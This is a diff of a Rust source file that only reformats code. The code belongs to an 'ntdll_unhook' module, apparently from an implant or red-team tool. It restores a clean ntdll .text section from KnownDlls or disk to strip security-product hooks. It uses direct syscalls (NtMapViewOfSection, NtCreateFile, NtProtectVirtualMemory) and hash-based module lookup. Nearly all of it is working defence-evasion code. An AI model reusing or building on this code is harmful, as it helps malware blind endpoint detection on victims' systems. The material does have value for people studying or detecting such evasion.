@@ -118,7 +118,7 @@ struct ImageNtHeaders64 {
     _opt_pad2: [u8; 4], // after SizeOfImage
     size_of_headers: u32,
     _opt_pad3: [u8; 112], // rest of optional header to data directories
-    // We don't need data directories for section walking — sections follow immediately
+                          // We don't need data directories for section walking — sections follow immediately
 }
 
 #[repr(C)]
@@ -272,9 +272,7 @@ unsafe fn find_text_section(base: usize) -> Option<(u32, u32, u32)> {
 
 /// Find the `.text` section from raw file bytes (for disk fallback).
 /// Returns `(file_offset_of_raw_data, raw_data_size, virtual_address, virtual_size)`.
-unsafe fn find_text_section_from_file(
-    file_buf: &[u8],
-) -> Option<(u32, u32, u32, u32)> {
+unsafe fn find_text_section_from_file(file_buf: &[u8]) -> Option<(u32, u32, u32, u32)> {
     if file_buf.len() < 64 {
         return None;
     }
@@ -363,11 +361,7 @@ fn invalidate_syscall_cache() {
                 );
             }
             Err(e) => {
-                log::warn!(
-                    "[ntdll_unhook] failed to re-resolve {}: {}",
-                    func_name,
-                    e
-                );
+                log::warn!("[ntdll_unhook] failed to re-resolve {}: {}", func_name, e);
             }
         }
     }
@@ -478,16 +472,16 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
     // NtMapViewOfSection: InheritDisposition = ViewUnmap (1), Win64Protect = PAGE_READONLY
     let status = crate::syscall!(
         "NtMapViewOfSection",
-        h_section as u64,           // SectionHandle
-        cur_proc,                    // ProcessHandle (current process)
+        h_section as u64,                 // SectionHandle
+        cur_proc,                         // ProcessHandle (current process)
         &mut clean_base as *mut _ as u64, // BaseAddress
-        0u64,                        // ZeroBits
-        0u64,                        // CommitSize
-        0u64,                        // SectionOffset (NULL)
-        &mut view_size as *mut _ as u64, // ViewSize
-        1u64,                        // InheritDisposition = ViewUnmap
-        0u64,                        // AllocationType
-        PAGE_READONLY as u64,        // Win64Protect
+        0u64,                             // ZeroBits
+        0u64,                             // CommitSize
+        0u64,                             // SectionOffset (NULL)
+        &mut view_size as *mut _ as u64,  // ViewSize
+        1u64,                             // InheritDisposition = ViewUnmap
+        0u64,                             // AllocationType
+        PAGE_READONLY as u64,             // Win64Protect
     )
     .map_err(|e| anyhow::anyhow!("NtMapViewOfSection(KnownDlls) syscall error: {e}"))?;
 
@@ -506,16 +500,14 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
     );
 
     // ── Step 3: Find .text sections in both copies ───────────────────────
-    let clean_text = find_text_section(clean_base).ok_or_else(|| {
-        anyhow::anyhow!("could not find .text section in clean KnownDlls ntdll")
-    })?;
+    let clean_text = find_text_section(clean_base)
+        .ok_or_else(|| anyhow::anyhow!("could not find .text section in clean KnownDlls ntdll"))?;
 
     let hooked_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
         .ok_or_else(|| anyhow::anyhow!("cannot resolve hooked ntdll base"))?;
 
-    let hooked_text = find_text_section(hooked_base).ok_or_else(|| {
-        anyhow::anyhow!("could not find .text section in hooked ntdll")
-    })?;
+    let hooked_text = find_text_section(hooked_base)
+        .ok_or_else(|| anyhow::anyhow!("could not find .text section in hooked ntdll"))?;
 
     let (clean_text_rva, clean_text_vsize, _) = clean_text;
     let (hooked_text_rva, hooked_text_vsize, _) = hooked_text;
@@ -556,11 +548,7 @@ unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
 
     if status < 0 {
         // Cleanup: unmap clean copy and close section handle
-        let _ = crate::syscall!(
-            "NtUnmapViewOfSection",
-            cur_proc,
-            clean_base as u64,
-        );
+        let _ = crate::syscall!("NtUnmapViewOfSection", cur_proc, clean_base as u64,);
         let _ = crate::syscall!("NtClose", h_section as u64);
         return Err(anyhow::anyhow!(
             "NtProtectVirtualMemory(RW) on hooked .text failed: NTSTATUS {:#010x}",
@@ -622,7 +610,10 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
     let ntdll_path = format!("\\??\\{}\\System32\\ntdll.dll", sysroot);
 
     // ── Step 1: Open ntdll from disk ─────────────────────────────────────
-    let mut path_u16: Vec<u16> = ntdll_path.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut path_u16: Vec<u16> = ntdll_path
+        .encode_utf16()
+        .chain(std::iter::once(0))
+        .collect();
     let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
         Length: ((path_u16.len() - 1) * 2) as u16,
         MaximumLength: (path_u16.len() * 2) as u16,
@@ -648,8 +639,8 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
         0u64, // AllocationSize
         0u64, // FileAttributes
         FILE_SHARE_READ as u64,
-        1u64,                                   // CreateDisposition = FILE_OPEN
-        0x60u64,                                 // CreateOptions = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
+        1u64,    // CreateDisposition = FILE_OPEN
+        0x60u64, // CreateOptions = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
     )
     .map_err(|e| anyhow::anyhow!("NtCreateFile(ntdll.dll) syscall error: {e}"))?;
 
@@ -696,9 +687,8 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
     }
 
     // ── Step 3: Parse PE headers to find .text section ───────────────────
-    let (raw_offset, raw_size, _text_rva, _text_vsize) =
-        find_text_section_from_file(&file_buf)
-            .ok_or_else(|| anyhow::anyhow!("could not find .text in on-disk ntdll"))?;
+    let (raw_offset, raw_size, _text_rva, _text_vsize) = find_text_section_from_file(&file_buf)
+        .ok_or_else(|| anyhow::anyhow!("could not find .text in on-disk ntdll"))?;
 
     // If .text extends beyond our initial read, we need to read more.
     // For typical ntdll.dll, .text is usually within the first 2 MB.
@@ -711,7 +701,10 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
 
         // Re-open and read the full file
         let mut h_file2: usize = 0;
-        let mut path_u16_2: Vec<u16> = ntdll_path.encode_utf16().chain(std::iter::once(0)).collect();
+        let mut path_u16_2: Vec<u16> = ntdll_path
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
         let mut obj_name_2 = winapi::shared::ntdef::UNICODE_STRING {
             Length: ((path_u16_2.len() - 1) * 2) as u16,
             MaximumLength: (path_u16_2.len() * 2) as u16,
@@ -735,8 +728,8 @@ unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
             0u64,
             0u64,
             FILE_SHARE_READ as u64,
-            1u64,                                   // CreateDisposition = FILE_OPEN
-            0x60u64,                                 // CreateOptions = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
+            1u64,    // CreateDisposition = FILE_OPEN
+            0x60u64, // CreateOptions = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
         )
         .map_err(|e| anyhow::anyhow!("NtCreateFile(re-read) syscall error: {e}"))?;
         if status2 < 0 {
@@ -908,11 +901,7 @@ pub fn unhook_ntdll() -> anyhow::Result<UnhookResult> {
                             e,
                             e2
                         );
-                        Err(anyhow::anyhow!(
-                            "KnownDlls: {}; Disk: {}",
-                            e,
-                            e2
-                        ))
+                        Err(anyhow::anyhow!("KnownDlls: {}; Disk: {}", e, e2))
                     }
                 }
             }
